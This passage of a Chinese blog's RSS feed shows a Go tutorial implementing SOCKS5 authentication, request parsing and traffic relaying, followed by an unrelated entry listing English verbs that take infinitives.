&lt;span class="nx">n&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">conn&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span>&lt;span class="p">{&lt;/span>
&lt;span class="nx">log&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Println&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">err&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">err&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">VER&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">b&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">VER&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">5&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">errors&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">New&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;该协议不是socks5协议&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ULEN&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">b&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">UNAME&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">string&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ULEN&lt;/span>&lt;span class="p">])&lt;/span>
&lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">PLEN&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">b&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ULEN&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">PASSWD&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">string&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">n&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nb">int&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">PLEN&lt;/span>&lt;span class="p">):&lt;/span>&lt;span class="nx">n&lt;/span>&lt;span class="p">])&lt;/span>
&lt;span class="nx">log&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Println&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">UNAME&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">PASSWD&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">username&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">UNAME&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="nx">passwd&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">PASSWD&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">errors&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">New&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;账号密码错误&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="cm">/**
&lt;/span>&lt;span class="cm"> 回应客户端,响应客户端连接成功
&lt;/span>&lt;span class="cm"> The server verifies the supplied UNAME and PASSWD, and sends the
&lt;/span>&lt;span class="cm"> following response:
&lt;/span>&lt;span class="cm"> +----+--------+
&lt;/span>&lt;span class="cm"> |VER | STATUS |
&lt;/span>&lt;span class="cm"> +----+--------+
&lt;/span>&lt;span class="cm"> | 1 | 1 |
&lt;/span>&lt;span class="cm"> +----+--------+
&lt;/span>&lt;span class="cm"> A STATUS field of X&amp;#39;00&amp;#39; indicates success. If the server returns a
&lt;/span>&lt;span class="cm"> `failure&amp;#39; (STATUS value other than X&amp;#39;00&amp;#39;) status, it MUST close the
&lt;/span>&lt;span class="cm"> connection.
&lt;/span>&lt;span class="cm"> */&lt;/span>
&lt;span class="nx">resp&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="p">[]&lt;/span>&lt;span class="kt">byte&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="mh">0x05&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x00&lt;/span>&lt;span class="p">}&lt;/span>
&lt;span class="nx">conn&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">resp&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="kc">nil&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>但其实，现在大家都习惯自己采用加密流的方式进行加密，很少采用用户名密码的形式进行加密，后面章节会介绍一种对 SOCKS 的混淆加密方式。&lt;/p>
&lt;h4 id="3请求信息">（3）请求信息&lt;/h4>
&lt;p>认证结束后客户端就可以发送请求信息。如果认证方法有特殊封装要求，请求必须按照方法所定义的方式进行封装解密，其原始格式如下：&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>VER&lt;/th>
&lt;th>CMD&lt;/th>
&lt;th>RSV&lt;/th>
&lt;th>ATYP&lt;/th>
&lt;th>DST.ADDR&lt;/th>
&lt;th>DST.PORT&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;td>0x00&lt;/td>
&lt;td>1&lt;/td>
&lt;td>动态&lt;/td>
&lt;td>2&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;ul>
&lt;li>VER 是 SOCKS 版本，这里应该是 0x05；&lt;/li>
&lt;li>CMD 是 SOCK 的命令码
&lt;ul>
&lt;li>0x01 表示 CONNECT 请求&lt;/li>
&lt;li>0x02 表示 BIND 请求&lt;/li>
&lt;li>0x03 表示 UDP 转发&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>RSV 0x00，保留&lt;/li>
&lt;li>ATYP DST.ADDR 类型&lt;/li>
&lt;li>DST.ADDR 目的地址
&lt;ul>
&lt;li>0x01 IPv4 地址，DST.ADDR 部分 4 字节长度&lt;/li>
&lt;li>0x03 域名，DST.ADDR 部分第一个字节为域名长度，DST.ADDR 剩余的内容为域名，没有\0 结尾。&lt;/li>
&lt;li>0x04 IPv6 地址，16 个字节长度。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>DST.PORT 网络字节序表示的目的端口&lt;/li>
&lt;/ul>
&lt;p>代码实现：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;span class="lnt">43
&lt;/span>&lt;span class="lnt">44
&lt;/span>&lt;span class="lnt">45
&lt;/span>&lt;span class="lnt">46
&lt;/span>&lt;span class="lnt">47
&lt;/span>&lt;span class="lnt">48
&lt;/span>&lt;span class="lnt">49
&lt;/span>&lt;span class="lnt">50
&lt;/span>&lt;span class="lnt">51
&lt;/span>&lt;span class="lnt">52
&lt;/span>&lt;span class="lnt">53
&lt;/span>&lt;span class="lnt">54
&lt;/span>&lt;span class="lnt">55
&lt;/span>&lt;span class="lnt">56
&lt;/span>&lt;span class="lnt">57
&lt;/span>&lt;span class="lnt">58
&lt;/span>&lt;span class="lnt">59
&lt;/span>&lt;span class="lnt">60
&lt;/span>&lt;span class="lnt">61
&lt;/span>&lt;span class="lnt">62
&lt;/span>&lt;span class="lnt">63
&lt;/span>&lt;span class="lnt">64
&lt;/span>&lt;span class="lnt">65
&lt;/span>&lt;span class="lnt">66
&lt;/span>&lt;span class="lnt">67
&lt;/span>&lt;span class="lnt">68
&lt;/span>&lt;span class="lnt">69
&lt;/span>&lt;span class="lnt">70
&lt;/span>&lt;span class="lnt">71
&lt;/span>&lt;span class="lnt">72
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre class="chroma">&lt;code class="language-golang" data-lang="golang">&lt;span class="kd">type&lt;/span> &lt;span class="nx">Socks5Resolution&lt;/span> &lt;span class="kd">struct&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">VER&lt;/span> &lt;span class="kt">uint8&lt;/span>
&lt;span class="nx">CMD&lt;/span> &lt;span class="kt">uint8&lt;/span>
&lt;span class="nx">RSV&lt;/span> &lt;span class="kt">uint8&lt;/span>
&lt;span class="nx">ATYP&lt;/span> &lt;span class="kt">uint8&lt;/span>
&lt;span class="nx">DSTADDR&lt;/span> &lt;span class="p">[]&lt;/span>&lt;span class="kt">byte&lt;/span>
&lt;span class="nx">DSTPORT&lt;/span> &lt;span class="kt">uint16&lt;/span>
&lt;span class="nx">DSTDOMAIN&lt;/span> &lt;span class="kt">string&lt;/span>
&lt;span class="nx">RAWADDR&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">net&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">TCPAddr&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">func&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">s&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">Socks5Resolution&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nf">lstRequest&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">conn&lt;/span> &lt;span class="nx">net&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Conn&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="kt">error&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">b&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nb">make&lt;/span>&lt;span class="p">([]&lt;/span>&lt;span class="kt">byte&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">128&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">n&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">conn&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="nx">n&lt;/span> &lt;span class="p">&amp;lt;&lt;/span> &lt;span class="mi">7&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">log&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Println&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">err&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">errors&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">New&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;请求协议错误&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">VER&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">b&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">VER&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">5&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">errors&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">New&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;该协议不是socks5协议&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">CMD&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">b&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">CMD&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">1&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">errors&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">New&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;客户端请求类型不为代理连接, 其他功能暂时不支持.&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">RSV&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">b&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="c1">//RSV保留字端，值长度为1个字节
&lt;/span>&lt;span class="c1">&lt;/span>
&lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ATYP&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">b&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="k">switch&lt;/span> &lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ATYP&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="c1">// IP V4 address: X&amp;#39;01&amp;#39;
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">DSTADDR&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">b&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">4&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">net&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">IPv4len&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="mi">3&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="c1">// DOMAINNAME: X&amp;#39;03&amp;#39;
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">DSTDOMAIN&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">string&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">n&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">])&lt;/span>
&lt;span class="nx">ipAddr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">net&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">ResolveIPAddr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;ip&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">DSTDOMAIN&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">err&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">DSTADDR&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">ipAddr&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">IP&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="c1">// IP V6 address: X&amp;#39;04&amp;#39;
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">DSTADDR&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">b&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">4&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">net&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">IPv6len&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="k">default&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">errors&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">New&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;IP地址错误&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">DSTPORT&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">binary&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">BigEndian&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Uint16&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">n&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">n&lt;/span>&lt;span class="p">])&lt;/span>
&lt;span class="c1">// DSTADDR全部换成IP地址，可以防止DNS污染和封杀
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">RAWADDR&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">net&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">TCPAddr&lt;/span>&lt;span class="p">{&lt;/span>
&lt;span class="nx">IP&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">DSTADDR&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">Port&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nb">int&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">DSTPORT&lt;/span>&lt;span class="p">),&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="cm">/**
&lt;/span>&lt;span class="cm"> 回应客户端,响应客户端连接成功
&lt;/span>&lt;span class="cm"> +----+-----+-------+------+----------+----------+
&lt;/span>&lt;span class="cm"> |VER | REP | RSV | ATYP | BND.ADDR | BND.PORT |
&lt;/span>&lt;span class="cm"> +----+-----+-------+------+----------+----------+
&lt;/span>&lt;span class="cm"> | 1 | 1 | X&amp;#39;00&amp;#39; | 1 | Variable | 2 |
&lt;/span>&lt;span class="cm"> +----+-----+-------+------+----------+----------+
&lt;/span>&lt;span class="cm"> */&lt;/span>
&lt;span class="nx">resp&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="p">[]&lt;/span>&lt;span class="kt">byte&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="mh">0x05&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x00&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x00&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x01&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x00&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x00&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x00&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x00&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x00&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x00&lt;/span>&lt;span class="p">}&lt;/span>
&lt;span class="nx">conn&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">resp&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="kc">nil&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h4 id="4最后将信息进行转发即可">（4）最后将信息进行转发即可&lt;/h4>
&lt;p>代码实现:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre class="chroma">&lt;code class="language-golang" data-lang="golang"> &lt;span class="nx">wg&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nb">new&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">sync&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">WaitGroup&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">wg&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Add&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">go&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">defer&lt;/span> &lt;span class="nx">wg&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Done&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="k">defer&lt;/span> &lt;span class="nx">dstServer&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Close&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="nx">io&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Copy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">dstServer&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">client&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}()&lt;/span>
&lt;span class="k">go&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">defer&lt;/span> &lt;span class="nx">wg&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Done&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="k">defer&lt;/span> &lt;span class="nx">client&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Close&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="nx">io&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Copy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">client&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">dstServer&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}()&lt;/span>
&lt;span class="nx">wg&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Wait&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>固定搭配</title><link>https://sdttttt.github.io/blog/gudingdapei/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://sdttttt.github.io/blog/gudingdapei/</guid><description>
&lt;h2 id="接不定式而不接动名词作宾语的24个常用动词">接不定式（而不接动名词）作宾语的24个常用动词&lt;/h2>
&lt;p>afford to do sth. 负担得起做某事&lt;/p>
&lt;p>agree to do sth. 同意做某事&lt;/p>
&lt;p>arrange to do sth.安排做某事&lt;/p>
&lt;p>ask to do sth. 要求做某事&lt;/p>
&lt;p>beg to do sth. 请求做某事&lt;/p>
&lt;p>care to do sth. 想要做某事&lt;/p>
&lt;p>choose to do sth. 决定做某事&lt;/p>
&lt;p>decide to do sth. 决定做某事&lt;/p>
&lt;p>demand to do sth. 要求做某事&lt;/p>
&lt;p>determine to do sth. 决心做某事&lt;/p>
&lt;p>expect to do sth. 期待做某事&lt;/p>
&lt;p>fear to do sth. 害怕做某事&lt;/p>
&lt;p>help to do sth. 帮助做某事&lt;/p>
&lt;p>hope to do sth. 希望做某事&lt;/p>
&lt;p>learn to do sth. 学习做某事&lt;/p>
&lt;p>manage to do sth. 设法做某事&lt;/p>
&lt;p>offer to do sth. 主动提出做某事&lt;/p>
&lt;p>plan to do sth. 计划做某事&lt;/p>
&lt;p>prepare to do sth. 准备做某事&lt;/p>
&lt;p>pretend to do sth. 假装做某事&lt;/p>
&lt;p>promise to do sth. 答应做某事&lt;/p>
&lt;p>refuse to do sth. 拒绝做某事&lt;/p>
&lt;p>want to do sth. 想要做某事&lt;/p>
&lt;p>wish to do sth. 希望做某事&lt;/p>
&lt;p>注：有些不及物动词后习惯上也接不定式，不接动名词：&lt;/p>
